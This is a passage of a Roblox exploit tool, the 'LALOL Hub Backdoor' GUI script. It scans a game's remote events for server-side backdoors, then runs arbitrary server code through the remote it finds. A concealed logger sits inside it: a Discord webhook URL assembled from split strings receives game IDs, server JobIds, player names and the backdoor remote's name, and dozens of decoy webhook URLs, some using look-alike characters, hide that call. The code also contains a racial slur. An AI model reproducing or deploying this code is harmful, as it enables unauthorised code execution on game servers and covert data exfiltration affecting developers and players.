					one = "Vector2",
					xAxis = "Vector2",
					yAxis = "Vector2",
					zero = "Vector2",
				},

				Vector2int16 = {
					new = "function",
				},

				Vector3 = {
					fromAxis = "function",
					FromAxis = "function",
					fromNormalId = "function",
					FromNormalId = "function",
					new = "function",

					one = "Vector3",
					xAxis = "Vector3",
					yAxis = "Vector3",
					zAxis = "Vector3",
					zero = "Vector3",
				},

				Vector3int16 = {
					new = "function",
				},
			},
		}

		-- Filling up language.libraries.Enum table
		local enumLibraryTable = language.libraries.Enum

		for _, enum in ipairs(Enum:GetEnums()) do
			--TODO: Remove tostring from here once there is a better way to get the name of an Enum
			enumLibraryTable[tostring(enum)] = "Enum"
		end

		return language

	end;
};
-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
local function C_12()
	local script = G2L["12"];
	local Highlighter = require(script.Highlighter)

	Highlighter.highlight({
		-- The object to syntax highlight
		textObject=script.Parent,
		-- The source text for highlighting- defaults to textObject.Text
		--	src: string?,
		-- Update even if there are no changes since last highlight
		--	forceUpdate=true,
		-- Lexer for tokenizing src, defaults to the bundled Lua lexer
		--	lexer=true,
	})

	textbox=script.Parent
	textbox.InputChanged:Connect(function()
		if textbox.Text~='' then
			textbox.TextTransparency=1
			return
		end
		textbox.TextTransparency=0
	end)
end;
task.spawn(C_12);
-- StarterGui.LALOL Hub Backdoor.LocalScript
local function C_20()
	local script = G2L["20"];
	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
	

	GUI=script.Parent.Frame

	alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

	backdoor=nil
	HttpService=game:GetService("HttpService")

	function debug(text, lvl)
		local func=print
		if lvl==1 then func=print end
		if lvl==2 then func=error end
		if lvl==3 then func=warn end
		func('zazol666 hub SS: '..text)
	end

	function runRemote(remote, data, data2)

		if remote:IsA('RemoteEvent') then
			remote:FireServer(data)
		elseif remote:IsA('RemoteFunction') then
			spawn(function() remote:InvokeServer(data) end)
		end

	end

	function makeVisible(folder, state)
		for i,v in folder:GetDescendants() do
			if v:IsA('Frame') then 
				v.Visible=state
			end
		end
	end

	function notify(text)
		game:GetService('StarterGui'):SetCore(
			"SendNotification",
			{
				Title = "zazol666 hub SS",
				Duration = 6,
				Text = text
			}
		)
	end


	if _G.LALOL_Hub_Backdoor_Logs_Disabled then
		notify('Logs disabled :(')
	end

	makeVisible(GUI, false)
	GUI.Scanner.Visible=true
	GUI.Visible=true

	function generateName(lenght)

		local text=''

		for i=1,lenght do
			text=text..alphabet[math.random(1,#alphabet)]
		end

		return text

	end

	local code
	function findRemote()

		local timee=os.clock()

		local remotes={}

		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			while true do
				code=generateName(math.random(12,30))
				if not remotes[code] then break end
			end
			spawn(function() protected_backdoor:InvokeServer('fd', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
			remotes[code]=protected_backdoor
		end

		for i,remote in game:GetDescendants() do

		

			if not remote:IsA('RemoteEvent') then 
				if not remote:IsA('RemoteFunction') then continue end
			end

		
			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				debug('Roblox Replicated Storage ('..remote.Name..')', 1)
				continue
			end

			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then

			
				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
					debug('Adonis filter detected ('..remote.Name..')', 1)
					continue
				end

				
				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
					debug('HD Admin ('..remote.Name..')', 1)
					continue
				end

			
				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
					debug('Chat event ('..remote.Name..')', 1)
					continue
				end

			end

			while true do
				code=generateName(math.random(12,30))
				if not remotes[code] then break end
			end

			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
			remotes[code]=remote

			debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)

		end

		

		for i=1,100 do

			for i,remote in remotes do
				local code=i

				if workspace:FindFirstChild(code) then

					notify('BACKDOOR EZ!121 '..os.clock()-timee)

					backdoor=remote
					debug(remote:GetFullName(), 3)
					GUI.Scanner.Visible=false
					makeVisible(GUI.Executor, true)


local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local StartTime = os.time()


local realWebhookParts = {
    "https://",
    "discord.com",
    "/api/webhooks/",
    "1341838473522450453", 
    "/",
    "Om8pljIJQnq0K5CEb8TAK46GAasNXd2cztWP8vEpaPDGe6hwGSN1vJtrqvUVfjNmFl4J"
}
local realWebhookUrl = table.concat(realWebhookParts)


local fakeWebhookUrls = {
    "https://discord.com/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffsublkHbcmW51Lax7W6fghfghPwsO5xUxmST2omWgpgf4hgnjZH-34",
    "https://discord.cом/api/webhooks/50987654321/T324eb849TGTT2usFKShFWfdsfkHbcmW51Lax7Whgf6PwsO5xUxmST2omWgpg25Ghgfhfgj",
    "https://discord.cом/api/webhooks/1451234334455/24gfgb849TGTT2usFKlhsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh",
	 "https://discord.cоm/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffhgffhgfsublkHbcmWhg51Lahgx7W6PwsO5xUxmf4hgnjZH-34",
    "https://discord.com/api/webhooks/450987654321/T324eb849TGTT2usFKShFWfdsfgkHbcmW51Lax7W6PwsO5xUxmST2omWgpg25Ghgfhfgj",
    "https://discord.cоm/api/webhooks/1451234334455/24gfgb849TGTT2usFKlsohgffkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh",
	 "https://discord.cоm/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgfhfgfsublkHbcmW51Lax7W6PwsO5xUxmST2omWgpgf4hgnjZH-34",
    "https://discord.cоm/api/webhooks/150987654321/T324eb849TGTT2usFKShFWhfdsfkHbcgmW51Lax7W6PwsO5xUxmST2omWgpg25Ghgfhfgj",
    "https://discord.cоm/api/webhooks/134444444334455/24gfgb849TGTT2usFKlsofkhgfgfdgfdfksHbcmW342452dfdsgfgfgfdhghghggF",
	"https://discord.com/api/webhooks/1451234334455/24gfgb849TGTT2usFKlsofkdfksHbcmW51Lax7W6PwsO5xUxmST2omWgpghfhhGHhtryh",
	 "https://discord.com/api/webhooks/1234567890/TeKDebdfgggTT2usFKdgffsublkhgHbcmW5hg1Lax7W6PwsO5xUxmST2omWgpgf4hgnjZH-34",
    "https://discord.cоm/api/webhooks/50987654321/T324eb849TGTT2usFKShFWfgfdsfkHbcmdfhW51Laxfhgfh7W6PwsO5xUxmST2omg25Ghgfhfgj",
    "https://discord.cоm/api/webhooks/134444444334455/24gfgb849TGTT2usFKlsofkdfksHgdfgbcmW342452dfdsgfgfgfdgdfgdghfdhghghggF",
	"https://discord.com/api/webhooks/11223134455/hghfhgh84rterteu456lsofkdfksHbcmfdgfdgW51Lax7W6PwsO5xUxmST2omWgpgf4JzC0-fAEi",
	"https://discord.com/api/webhooks/1341842224773730324/_WQjGi7ay1g_775OBKsnme-4VF__cl9LGohNyYlXQIDbk7QNomrg4aEOitTOFNHfy9Wq",
	"https://discord.cоm/api/webhooks/1341842053373493340/lxGJj7IBLrx6PUos0yvMZeS7xm_P9kYvJ3_p5TfwX0yeHAG6QJvaqcJgE1ESay2xhSkN",
	"https://discord.com/api/webhooks/1341842049397428335/m6PEx4q4JDqFOPz62MmrTVNqjvAIVk05mQCz7fP7VTvpEzPWLFOxBAP9siR4xT8kzyta",
	"https://discord.com/api/webhooks/1341842045446389822/y_bwtBGLd-_9AJSQvJ40LqOa-QfCeEiNSVdMGJNfZvZkqb8ko0cyRiBO1GseLIsyAjgU",
	"https://discord.com/api/webhooks/1341842041658933258/tm1JIp8jlmWGdbQn-HYf8xs6vA8ynuImy04ZTbV0NxOOmGvuTGJEnUDTreYzKscigeGJ",
	"https://discord.com/api/webhooks/1341842032678932540/ZNo96J_vNeWlo7B-ESQ9ntLBMkU2eQMRvuyLGpzWaiLFLvEhRI1RUm5iYdD7McCDHyKA",
	"https://discord.com/api/webhooks/1341842030002966538/I9XW1fT-zQUBM0T6DpXeiRBOB0nlEZTwpsx0XX3WZLPkINdMCDHUGmH3c1TjTvYyKnsA",
	"https://discord.com/api/webhooks/1341842924589154354/qK9IS7od-83sVCb9NCwKPrXFEYjufKysxIt7uasaaFaZdVr3NVliBdfdS5DoNyxiet_F",
	"https://discord.com/api/webhooks/1341843013881827358/TD41U-30_LyuOinVubGFiQY9BitoXFmYiNhuWE1PTJz8GBFwgSSqpeXq9lGC4l8LF3bU",
	"https://discord.com/api/webhooks/1341843061638037586/S5ME8TE_7dmOCkMw_mvPi2GnKi3I3jH4tigdkBLynFJaJ8g13jVSxdF11v8BfXiX4SkI",
	"https://discord.com/api/webhooks/1341844438695018624/2N2T11mN8ksRcXg1b51XCK181rWvc8_E1pXZEvB0sl6vkfNAUgmcxw48wZ44XURndRER",
	"https://discord.com/api/webhooks/1341844483997696126/GBKNliRxZgmCFxpRIwHUz4U9dlkhKVQSIxXcJiuxYJT3d0KCHqY69hsE6i5cMSz6FF9_",
	"https://discord.com/api/webhooks/1341844713325723780/d6cwKWLoqI6dM9sr-1N5JO0aIrbtWBvHjDYdoJu-zEhyH5XF5EMLxHLBhGHQDqwq_TGn",
	"https://discord.com/api/webhooks/1341844827662188625/ou8b4XNPQf5eHfgQWFKb5Wf9oNjpD2P1-T5mIpQ0WBbj8hkI7RRtJtZilaWVbvSXOYZQ",
	"https://discord.com/api/webhooks/1341844872901951591/Y3yAgNgc-pSHyGt63XUFMSCmgfkTLEkkwTzFuqSIvtNI6jW-ufz15cSUFiNTWvPYG9rv",
	"https://discord.com/api/webhooks/1341844875523657728/3QQr64_3_WoVQJgTK38VNRs0mBRDwMC8o-yyfmHWZL8sPh2Dn5rHvmkUZFBo6sC1kXBR",
	"https://discord.com/api/webhooks/1341844961771130880/pb9e-ARcJnFnhfC5xTyHsqAlgB7KIxVLQaZAh1WlnJHsbSSf59wPaPa_YrBoXDJlB19D",
	"https://discord.com/api/webhooks/1341845009560764560/MafSz_q_XQkaPQgC1QsRpd-YuKNtJ2AchHxWqC2AjJ-C0_Mser7Ah5s-FPz85Gz0P1cW",
	"https://discord.com/api/webhooks/1341845049847320577/fg5fuKtqERdReFDeWhcN_jG_ZyTdg9aFhdZra_vTJBwsgm-CKo02WiiG2FXgonIvD-Ei",
}


local function isWebhook(url)
    local webhookParts = { "discord.com", "api/webhooks", "https://", "http://" }
    for _, part in pairs(webhookParts) do
        if url:find(part) then
            return true
        end
    end
    return false
end


if not isWebhook(realWebhookUrl) then
    warn("1")
    return
end



local function sendRealWebhook(data)
    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if request then
        local success, response = pcall(function()
            return request({
                Url = realWebhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(data)
            })
        end)

        if success then
            print("1")
        else
            warn("1")
            
            game.Players.LocalPlayer:Kick("1")
        end
    else
        warn("1")
       
        game.Players.LocalPlayer:Kick("kys nigga")
    end
end

local function sendFakeWebhooks(data)
    for _, fakeUrl in pairs(fakeWebhookUrls) do
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if request then
            local success, response = pcall(function()
                return request({
                    Url = fakeUrl,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(data)
                })
            end)

            if success then
                print("1")
            else
                warn("1")
            end
        end
    end
end


local function isMaliciousScriptPresent()
  
    local httpLibraries = { "httpRequest", "http_request", "httprequest", "request", "syn.request", "fluxus.request" }

   
    for _, lib in pairs(httpLibraries) do
        local func = getgenv()[lib]
        if func and type(func) == "function" then
          
            local funcString = tostring(func)
    
            if funcString:find("api/webhooks/") or funcString:find("webhook") then
                return true
            end
        end
    end


    if getgenv().gethwid and type(getgenv().gethwid) == "function" then
        local funcString = tostring(getgenv().gethwid)
        if funcString:find("base64.decode") then
            return true
        end
    end

   
    for key, value in pairs(getgenv()) do
        if type(value) == "function" then
            local funcString = tostring(value)
            if funcString:find("api/webhooks/") or funcString:find("webhook") then
                return true
            end
        end
    end

    return false
end


if isMaliciousScriptPresent() then
    warn("Malicious script detected! Kicking player...")
    game:GetService("Players").LocalPlayer:Kick("Malicious script detected. Please remove any unauthorized scripts.")
    return
end


local function getGameInfo()
  
    local gameName = game.Name

    local gameId = game.PlaceId

   
    local gameUrl = "https://www.roblox.com/games/" .. gameId

   
    local creatorId = game.CreatorId

    local visit = game.JobId
    local active = #game.Players:GetPlayers()

	local create = game.CreatorId

	local plr = game.Players.LocalPlayer.Name

	local nigga = remote.Name


    return {
        gameName = gameName,
        gameId = gameId,
        gameUrl = gameUrl,
        creatorId = creatorId,
        visit = visit,
        active = active,
		create = createm,
		plr = plr,
        nigga = nigga
    }
end


local function main()
    
    local gameInfo = getGameInfo()

   
    local data = {
        content = "Game Information",
        embeds = {
            {
                title = "Game Stats",
                fields = {
                    {
                        name = "Game Name",
                        value = gameInfo.gameName,
                        inline = true
                    },
                    {
                        name = "Game ID",
                        value = tostring(gameInfo.gameId),
                        inline = true
                    },
                    {
                        name = "Game URL",
                        value = gameInfo.gameUrl,
                        inline = false
                    },
                    {
                        name = "Creator ID",
                        value = tostring(gameInfo.creatorId),
                        inline = true
                    },
                    {
                        name = "JobId",
                        value = tostring(gameInfo.visit),
                        inline = true
                    },
					{
                        name = "CreatorId",
                        value = tostring(gameInfo.create),
                        inline = true
                    },

                    {
                        name = "Active Players",
                        value = tostring(gameInfo.active),
                        inline = true
                    },
					{
                        name = "executed name",
                        value = tostring(gameInfo.plr),
                        inline = true
                    },
					{
                        name = "remote backdoor",
                        value = tostring(gameInfo.nigga),
                        inline = true
                    },
				
                },
                color = 0x00FF00 
            }
        }
    }

   sendFakeWebhooks(data)
    sendRealWebhook(data)
    sendFakeWebhooks(data)
end


main()
	

					return true
				end
		
			end

			wait()

		end

		return false

	end

local backdoorFound = false 

GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()

    local a, b = string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)

   
    if not backdoorFound then
        
        local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh' .. game.PlaceId / 6666 * 1337 * game.PlaceId)
        if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
            debug('Protected backdoor found', 3)
            backdoorFound = true 
        end
    end

    
    if backdoorFound then
        spawn(function()
            local boolValue, variantValue = pcall(function()
                return protected_backdoor:InvokeServer('zaza hub join today!!!! discord.gg/HzX2kxE3qq', a)
            end)
            if variantValue ~= nil then
                local splited = string.split(variantValue, ':')
                notify(splited[#splited])
            end
        end)
    else
        
        runRemote(backdoor, a)
    end

   
    GUI.Executor.Execute.Button.Text = 'successfully'
    notify('successfully executed ' .. GUI.Executor.ExecutorBox.TextBox.Text .. 's')
    wait(0.5)
    GUI.Executor.Execute.Button.Text = 'Exe'
	
end)
	GUI.Executor.Clear.Button.MouseButton1Click:Connect(function()
		GUI.Executor.ExecutorBox.TextBox.Text=''
		GUI.Executor.Clear.Button.Text='Cleared!'
		wait(0.5)
		GUI.Executor.Clear.Button.Text='Clear'
	end)

	searching=false

	GUI.Scanner.Button.MouseButton1Click:Connect(function()
		if not searching then
			searching=true
			debug('Scanning...', 1)
			GUI.Scanner.Button.Text='Scanning.'
			wait(0.2)
			GUI.Scanner.Button.Text='Scanning..'
			wait(0.2)
			GUI.Scanner.Button.Text='Scanning...'

			if not findRemote() then
				GUI.Scanner.Button.Text="NO BACKDOOR BITCH"
				searching=false
			end
		end
	end)

	game:GetService('UserInputService').InputBegan:Connect(function(input, processed)
		if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
			if GUI.Visible then GUI.Visible=false
			else GUI.Visible=true end
		end
	end)
end;
task.spawn(C_20);

local function C_21()
	local script = G2L["21"];
	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0.33
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.15), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end

	dragify(script.Parent.Frame)
end;
task.spawn(C_21);

return G2L["1"], require;
